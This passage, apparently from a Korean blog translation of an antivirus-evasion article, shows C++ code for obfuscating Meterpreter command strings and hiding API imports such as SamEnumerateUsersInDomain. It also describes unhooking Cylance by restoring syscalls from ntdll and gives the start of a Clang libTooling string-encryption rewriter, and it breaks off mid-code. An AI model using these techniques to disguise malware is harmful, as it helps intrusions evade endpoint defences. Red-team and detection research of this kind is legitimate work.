hid_extapi_PHxnGM7M0609[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_extapi_J7EGS6FRHwkV[] = &#123;<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-number">0</span>&#125;;Command customCommands[] =&#123;    COMMAND_REQ(hid_extapi_UQOoNXigAPq4, request_window_enum),    COMMAND_REQ(hid_extapi_vhFHmZ8u2hfz, request_service_enum),    COMMAND_REQ(hid_extapi_pW25eeIGBeru, request_service_query),    COMMAND_REQ(hid_extapi_S4Ws57MYBjib, request_service_control),    COMMAND_REQ(hid_extapi_HJ0lD9Dl56A4, request_clipboard_get_data),    COMMAND_REQ(hid_extapi_IiEzXils3UsR, request_clipboard_set_data),    COMMAND_REQ(hid_extapi_czLOBo0HcqCP, request_clipboard_monitor_start),    COMMAND_REQ(hid_extapi_WcWbTrsQujiT, request_clipboard_monitor_pause),    COMMAND_REQ(hid_extapi_rPiFTZW4ShwA, request_clipboard_monitor_resume),    COMMAND_REQ(hid_extapi_05fAoaZLqOoy, request_clipboard_monitor_purge),    COMMAND_REQ(hid_extapi_cOOyHTPTvZGK, request_clipboard_monitor_stop),    COMMAND_REQ(hid_extapi_smtmvW05cI9y, request_clipboard_monitor_dump),    COMMAND_REQ(hid_extapi_01kuYCM8z49k, request_adsi_domain_query),    COMMAND_REQ(hid_extapi_SMK9uFj6nThk, ntds_parse),    COMMAND_REQ(hid_extapi_PHxnGM7M0609, request_wmi_query),    COMMAND_REQ(hid_extapi_J7EGS6FRHwkV, request_pageant_send_query),    COMMAND_TERMINATOR&#125;;</code></pre><h2 id="API-Import-숨기기"><a href="#API-Import-숨기기" class="headerlink" title="API Import 숨기기"></a>API Import 숨기기</h2><p>외부 라이브러리에서 export 된 함수를 호출하면 linker가 <em>Import Address Table</em>(IAT)에 기록한다. 함수 이름은 바이너리에서 평문으로 볼 수 있고 실행하지 않고 정적으로 확인할 수 있다. 의심스러운 함수명들을 숨기고 정상적인 바이너리에 존재하는 것들은 유지하는 것이 좋다.</p><p>Meterpreter의 <em>kiwi</em> extension에서 다음과 같은 코드를 찾을 수 있다.</p><pre><code class="hljs cpp">enumStatus = SamEnumerateUsersInDomain(hDomain, &amp;EnumerationContext, <span class="hljs-number">0</span>, &amp;pEnumBuffer, <span class="hljs-number">100</span>, &amp;CountRetourne</code></pre><p>이 함수는 <code>samlib.dll</code>에서 export 되므로 컴파일된 바이너리에는 <code>samlib.dll</code>과 <code>SamEnumberateUsersInDomain</code> 문자열이 표시된다.</p><p>이를 해결하기 위해 실행 중에 <code>LoadLibrary/GetProcAddress</code>를 사용하여 API를 가져올 수 있다. 이 함수들은 문자열을 인자로 사용하므로 난독화를 잘해야 한다. 따라서 위의 코드를 다음과 같이 재작성해야 한다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(__stdcall* _SamEnumerateUsersInDomain)</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    SAMPR_HANDLE DomainHandle,</span></span><span class="hljs-function"><span class="hljs-params">    PDWORD EnumerationContext,</span></span><span class="hljs-function"><span class="hljs-params">    DWORD UserAccountControl,</span></span><span class="hljs-function"><span class="hljs-params">    PSAMPR_RID_ENUMERATION* Buffer,</span></span><span class="hljs-function"><span class="hljs-params">    DWORD PreferedMaximumLength,</span></span><span class="hljs-function"><span class="hljs-params">    PDWORD CountReturned</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-keyword">char</span> hid_SAMLIB_01zmejmkLCHt[] = &#123;<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;I&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">char</span> hid_SamEnu_BZxlW5ZBUAAe[] = &#123;<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;U&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;I&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-number">0</span>&#125;;HANDLE hhid_SAMLIB_BZUriyLrlgrJ = LoadLibrary(hid_SAMLIB_01zmejmkLCHt);_SamEnumerateUsersInDomain ffSamEnumerateUsersInDoma =(_SamEnumerateUsersInDomain)GetProcAddress(hhid_SAMLIB_BZUriyLrlgrJ, hid_SamEnu_BZxlW5ZBUAAe);enumStatus = ffSamEnumerateUsersInDoma(hDomain, &amp;EnumerationContext, <span class="hljs-number">0</span>, &amp;pEnumBuffer, <span class="hljs-number">100</span>, &amp;CountRetourned);</code></pre><h2 id="syscall-재작성"><a href="#syscall-재작성" class="headerlink" title="syscall 재작성"></a>syscall 재작성</h2><p>Cylance가 실행 중인 컴퓨터에서 Meterpreter의 <em>migrate</em>를 사용하면 안티바이러스 탐지가 실행된다. Cylance는 userland hook으로 프로세스 인젝션을 탐지한다. 탐지를 우회하려면 hook을 제거하는 것으로 간단히 우회할 수 있다. ntdll을 읽은 후 syscall 번호를 복구하고 ready-to-call shellcode에 삽입하는 것은 간단하고 userland hook을 효과적으로 우회한다. 필자는 지금까지 NTDLL.DLL을 악성 파일로 판단하는 것을 보지 못했다.</p><h1 id="구현"><a href="#구현" class="headerlink" title="구현"></a>구현</h1><p>앞서 말한 모든 아이디어들은 <em>libTooling</em>을 기반으로 한 source code refactoring tool에서 구현할 수 있다. 이 부분은 <em>libTooling</em> 문서가 부족해서 필자의 팀에서 가능한 시간 동안 한 것을 문서화했다. 따라서 개선의 여지가 있으며 무언가 눈에 띄는 경우 필자는 그것에 대해 듣고 싶다.</p><h2 id="추상-구문-트리-101"><a href="#추상-구문-트리-101" class="headerlink" title="추상 구문 트리 101"></a>추상 구문 트리 101</h2><p>컴파일러는 보통 여러 구성 요소로 구성되는데 일반적으로 <em>Parser</em>와 <em>Lexer</em>로 구성된다. 소스 코드가 컴파일러에 들어가면 먼저 프로그래머가 작성한 원본 소스 코드에서 Parse Tree를 생성하고 컴파일러가 필요로 하는 노드에 semantic information을 추가한다. 이 결과를 <em>Abstract Syntax Tree</em>(추상 구문 트리)라고 부른다. 다음은 위키피디아의 예시이다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">while</span> b ≠ <span class="hljs-number">0</span>  <span class="hljs-keyword">if</span> a &gt; b    a := a − b  <span class="hljs-keyword">else</span>    b := b − a<span class="hljs-keyword">return</span> a</code></pre><p>간단한 프로그램의 일반적인 AST는 다음과 같다.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/2.png"></p><p><a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree">추상 구문 트리 예시</a></p><p>이 데이터 구조는 다른 프로그램의 property를 이해하는 프로그램을 작성할 때 정밀한 알고리즘을 제공하므로 대규모 코드 refactoring에 적합하다.</p><h3 id="Clang’s-Abstract-Syntax-Tree"><a href="#Clang’s-Abstract-Syntax-Tree" class="headerlink" title="Clang’s Abstract Syntax Tree"></a>Clang’s Abstract Syntax Tree</h3><p>The Right Way의 소스 코드를 변경해야 하므로 Clang의 AST에 대해 알아야 한다. Clagn은 AST 덤프를 command-line switch에 예쁘게 표시하지만 컴파일러 플래그 설정이 까다롭다.</p><p>간단한 테스트 translation unit을 만들어보자.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span> <span class="hljs-params">(NTAPI *f_NtMapViewOfSection)</span><span class="hljs-params">(HANDLE, HANDLE, PVOID *, ULONG, ULONG,</span></span><span class="hljs-function"><span class="hljs-params">PLARGE_INTEGER, PULONG, ULONG, ULONG, ULONG)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>&#123;    f_NtMapViewOfSection lNtMapViewOfSection;    HMODULE ntdll;    <span class="hljs-keyword">if</span> (!(ntdll = LoadLibrary(TEXT(<span class="hljs-string">&quot;ntdll&quot;</span>))))    &#123;        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    lNtMapViewOfSection = (f_NtMapViewOfSection)GetProcAddress(ntdll, <span class="hljs-string">&quot;NtMapViewOfSection&quot;</span>);    lNtMapViewOfSection(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>그리고 다음 스크립트를 <code>.sh</code> 파일에 작성해라</p><pre><code class="hljs cpp">WIN_INCLUDE=<span class="hljs-string">&quot;/Users/vladimir/headers/winsdk&quot;</span>CLANG_PATH=<span class="hljs-string">&quot;/usr/local/Cellar/llvm/9.0.1&quot;</span>#<span class="hljs-string">&quot;/usr/lib/clang/8.0.1/&quot;</span>clang -cc1 -ast-dump <span class="hljs-string">&quot;$1&quot;</span> -D <span class="hljs-string">&quot;_WIN64&quot;</span> -D <span class="hljs-string">&quot;_UNICODE&quot;</span> -D <span class="hljs-string">&quot;UNICODE&quot;</span> -D <span class="hljs-string">&quot;_WINSOCK_DEPRECATED_NO_WARNINGS&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH/include&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/msvc-14.15.26726-include&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/ucrt&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/shared&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/um&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/winrt&quot;</span> \  <span class="hljs-string">&quot;-fdeprecated-macro&quot;</span> \  <span class="hljs-string">&quot;-w&quot;</span> \  <span class="hljs-string">&quot;-fdebug-compilation-dir&quot;</span>\  <span class="hljs-string">&quot;-fno-use-cxa-atexit&quot;</span> <span class="hljs-string">&quot;-fms-extensions&quot;</span> <span class="hljs-string">&quot;-fms-compatibility&quot;</span> \  <span class="hljs-string">&quot;-fms-compatibility-version=19.15.26726&quot;</span> <span class="hljs-string">&quot;-std=c++14&quot;</span> <span class="hljs-string">&quot;-fdelayed-template-parsing&quot;</span> <span class="hljs-string">&quot;-fobjc-runtime=gcc&quot;</span> <span class="hljs-string">&quot;-fcxx-exceptions&quot;</span> <span class="hljs-string">&quot;-fexceptions&quot;</span> <span class="hljs-string">&quot;-fseh-exceptions&quot;</span> <span class="hljs-string">&quot;-fdiagnostics-show-option&quot;</span> <span class="hljs-string">&quot;-fcolor-diagnostics&quot;</span> <span class="hljs-string">&quot;-x&quot;</span> <span class="hljs-string">&quot;c++&quot;</span></code></pre><p><code>WIN_INCLUDE</code>는 Win32 API와 interact 하기 위해 필요한 헤더들이 있는 폴더이다. 윈도우10에서 가져왔으며 MinGW에서 가져오지 말고 필자와 같은 방법으로 하는 것을 추천한다. 그 후 테스트 C 파일을 인자로 스크립트를 실행하면 18MB 파일이 생성되지만 <code>NtMapViewOfSection</code> 같은 우리가 선언한 문자열 리터럴을 검색해서 AST에서 봐야 할 부분으로 이동할 수 있다.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/3.png"></p><p>AST를 시각화했으므로 어떻게 노드를 업데이트해야 소스 코드의 syntax 오류가 없을지 알 수 있다. 뒷부분은 <em>libTooling</em>을 통한 AST manipulation 구현에 대해서 상세히 다룬다.</p><h3 id="ClangTool-boilerplate"><a href="#ClangTool-boilerplate" class="headerlink" title="ClangTool boilerplate"></a>ClangTool boilerplate</h3><p>구현을 하기 전에 boilerplate 코드가 필요하므로 다음 코드를 <code>main.cpp</code>에 입력해라.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/ASTConsumer.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/ASTContext.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/Decl.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/Type.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/ASTMatchers/ASTMatchFinder.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/ASTMatchers/ASTMatchers.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Basic/SourceManager.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Frontend/CompilerInstance.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Frontend/FrontendAction.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Tooling/CommonOptionsParser.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Tooling/Tooling.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Rewrite/Core/Rewriter.h&quot;</span></span><span class="hljs-comment">// LLVM includes</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/ADT/ArrayRef.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/ADT/StringRef.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/Support/CommandLine.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;Consumer.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;MatchHandler.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;memory&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fstream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;clang/Tooling/Inclusions/IncludeStyle.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;clang/Tooling/Inclusions/HeaderIncludes.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sstream&gt;</span></span><span class="hljs-keyword">namespace</span> ClSetup &#123;    llvm::<span class="hljs-function">cl::OptionCategory <span class="hljs-title">ToolCategory</span><span class="hljs-params">(<span class="hljs-string">&quot;StringEncryptor&quot;</span>)</span></span>;&#125;<span class="hljs-keyword">namespace</span> StringEncryptor &#123;    clang::Rewriter ASTRewriter;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Action</span> :</span> <span class="hljs-keyword">public</span> clang::ASTFrontendAction &#123;    <span class="hljs-keyword">public</span>:        <span class="hljs-keyword">using</span> ASTConsumerPointer = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;clang::ASTConsumer&gt;;        <span class="hljs-function">ASTConsumerPointer <span class="hljs-title">CreateASTConsumer</span><span class="hljs-params">(clang::CompilerInstance &amp;Compiler,</span></span><span class="hljs-function"><span class="hljs-params">                                             llvm::StringRef Filename)</span> <span class="hljs-keyword">override</span> </span>&#123;            ASTRewriter.setSourceMgr(Compiler.getSourceManager(), Compiler.getLangOpts());            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;ASTConsumer*&gt; consumers;            consumers.push_back(&amp;StringConsumer);              <span class="hljs-comment">// several passes can be combined together by adding them to `consumers`</span>            <span class="hljs-keyword">auto</span> TheConsumer = llvm::make_unique&lt;Consumer&gt;();            TheConsumer-&gt;consumers = consumers;            <span class="hljs-keyword">return</span> TheConsumer;        &#125;        <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">BeginSourceFileAction</span><span class="hljs-params">(clang::CompilerInstance &amp;Compiler)</span> <span class="hljs-keyword">override</span> </span>&#123;            llvm::outs() &lt;&lt; <span class="hljs-string">&quot;Processing file &quot;</span> &lt;&lt; <span class="hljs-string">&#x27;\n&#x27;</span>;            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;        &#125;        <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">EndSourceFileAction</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>&#123;            clang::SourceManager &amp;SM = ASTRewriter.getSourceMgr();            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> FileName = SM.getFileEntryForID(SM.getMainFileID())-&gt;getName();            llvm::errs() &lt;&lt; <span class="hljs-string">&quot;** EndSourceFileAction for: &quot;</span> &lt;&lt; FileName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;            <span class="hljs-comment">// Now emit the rewritten buffer.</span>            llvm::errs() &lt;&lt; <span class="hljs-string">&quot;Here is the edited source file :\n\n&quot;</span>;            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> TypeS;            <span class="hljs-function">llvm::raw_string_ostream <span class="hljs-title">s</span><span class="hljs-params">(TypeS)</span></span>;            <span class="hljs-keyword">auto</span> FileID = SM.getMainFileID();            <span class="hljs-keyword">auto</span> ReWriteBuffer = ASTRewriter.getRewriteBufferFor(FileID);            <span class="hljs-keyword">if</span>(ReWriteBuffer != <span class="hljs-literal">nullptr</span>)                ReWriteBuffer-&gt;write((s));            <span class="hljs-keyword">else</span>&#123;                llvm::errs() &lt;&lt; <span class="hljs-string">&quot;File was not modified\n&quot;</span>;                <span class="hljs-keyword">return</span>;            &#125;            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> result = s.str();            <span class="hljs-function"><span class="hljs-built_in">std</span>::ofstream <span class="hljs-title">fo</span><span class="hljs-params">(FileName)</span></span>;                   <span class="hljs-keyword">if</span>(fo.is_open())                fo &lt;&lt; result;            <span class="hljs-keyword">else</span>                llvm::errs() &lt;&lt; <span class="hljs-string">&quot;[!] Error saving result to &quot;</span> &lt;&lt; FileName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;        &#125;    &#125;;&#125;auto main(int argc, const char *argv[]) -&gt; int &#123;    <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> clang::tooling;    <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> ClSetup;    <span class="hljs-function">CommonOptionsParser <span class="hljs-title">OptionsParser</span><span class="hljs-params">(argc, argv, ToolCategory)</span></span>;    <span class="hljs-function">ClangTool <span class="hljs-title">Tool</span><span class="hljs-params">(OptionsParser.getCompilations(),</span></span><span class="hljs-function"><span class="hljs-params">                   OptionsParser.getSourcePathList())</span></span>;    <span class="hljs-keyword">auto</span> Action = newFrontendActionFactory&lt;StringEncryptor::Action&gt;();    <span class="hljs-keyword">return</span> Tool.run(Action.get());&#125;</code></pre><p>이 boilerplate 코드는 공식 문서에서 가져와서 설명하지 않는다. 언급할만한 변경점은 <code>CreateASTConsumer</code>이다. 우리의 목표는 같은 translation unit에서 여러 transformation pass를 수행하는 것이다. consumers collection(필수 line: <code>consumer.push_back(&amp;...);</code>)에 항목들을 추가하면 된다.</p><h2 id="문자열-난독화-1"><a href="#문자열-난독화-1" class="headerlink" title="문자열 난독화"></a>문자열 난독화</h2><p>이 부분에서는 세 가지 단계로 구성된 문자열 난독화 패스에서 가장 중요한 구현 세부 사항을 설명한다.</p><ul><li>소스 코드에 문자열 리터럴을 찾는다.</li><li>그것들을 변수로 변환한다.</li><li>적절한 위치(함수 또는 전역 context 포함)에 변수 정의/할당을 삽입</li></ul><h3 id="소스-코드에서-문자열-리터럴-찾기"><a href="#소스-코드에서-문자열-리터럴-찾기" class="headerlink" title="소스 코드에서 문자열 리터럴 찾기"></a>소스 코드에서 문자열 리터럴 찾기</h3><p><code>StringConsumer</code>는 아래와 같이 정의될 수 있다.(<code>StringEncryptor</code> namespace의 앞부분)</p><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StringEncryptionConsumer</span> :</span> <span class="hljs-keyword">public</span> clang::ASTConsumer &#123;<span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">HandleTranslationUnit</span><span class="hljs-params">(clang::ASTContext &amp;Context)</span> <span class="hljs-keyword">override</span> </span>&#123;        <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> clang::ast_matchers;        <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> StringEncryptor;        llvm::outs() &lt;&lt; <span class="hljs-string">&quot;[StringEncryption] Registering ASTMatcher...\n&quot;</span>;        MatchFinder Finder;        <span class="hljs-function">MatchHandler <span class="hljs-title">Handler</span><span class="hljs-params">(&amp;ASTRewriter)</span></span>;        <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> Matcher = stringLiteral().bind(<span class="hljs-string">&quot;decl&quot;</span>);        Finder.addMatcher(Matcher, &amp;Handler);        Finder.matchAST(Context);    &#125;&#125;;StringEncryptionConsumer StringConsumer = StringEncryptionConsumer();</code></pre><p>translation unit이 있으면 Clang이 AST에서 패턴을 찾을 수 있고 찾을 때마다 호출될 핸들러를 등록할 수 있다. <a href="https://clang.llvm.org/docs/LibASTMatchersReference.html">ASTMatcher</a>는 강력한 패턴 매칭을 지원하지만 여기서는 문자열 리터럴만 찾으므로 충분히 활용되지 않는다.</p><p>우리는 <code>MatchHandler</code>를 구현하여 문제의 핵심을 파악할 수 있고 <code>MatchResult</code> instance를 얻을 수 있을 것이다. <code>MatchResult</code>는 식별된 AST 노드에 대한 참조와 중요한 context 정보를 포함한다.</p><p>클래스를 정의하여 <code>clang::ast_matchers::MatchFinder::MatchCallback</code>으로부터 좋은 stuff를 상속받자.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> AVCLEANER_MATCHHANDLER_H</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> AVCLEANER_MATCHHANDLER_H</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;memory&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/Support/CommandLine.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/ADT/StringRef.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/ADT/ArrayRef.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Rewrite/Core/Rewriter.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Tooling/Tooling.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Tooling/CommonOptionsParser.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Frontend/FrontendAction.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Frontend/CompilerInstance.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Basic/SourceManager.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/ASTMatchers/ASTMatchers.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/ASTMatchers/ASTMatchFinder.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/Type.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/Decl.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/ASTContext.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/ASTConsumer.h&quot;</span></span><span class="hljs-meta">#<span 